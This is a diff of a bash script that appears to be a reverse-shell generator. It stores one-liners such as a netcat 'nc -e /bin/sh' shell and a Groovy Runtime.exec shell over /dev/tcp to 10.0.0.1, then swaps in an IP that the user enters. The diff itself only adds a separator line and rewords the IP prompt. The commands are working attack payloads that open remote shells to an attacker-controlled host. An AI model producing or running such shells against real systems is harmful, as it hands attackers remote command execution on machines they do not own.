@@ -10,9 +10,9 @@ commands=(
     "nc -e /bin/sh 10.0.0.1 1234"
     "r = Runtime.getRuntime()\np = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[])\np.waitFor()"
 )
-
+echo -e "\n\033[1;37m_________________________________________________________\033[0m\n"
 # Ask the user for the IP address
-read -p "Enter the IP address to use in the commands: " ip_address
+read -p "Enter the IP for the shells: " ip_address
 
 # Replace the placeholder IP with the user-provided IP
 for i in "${!commands[@]}"; do
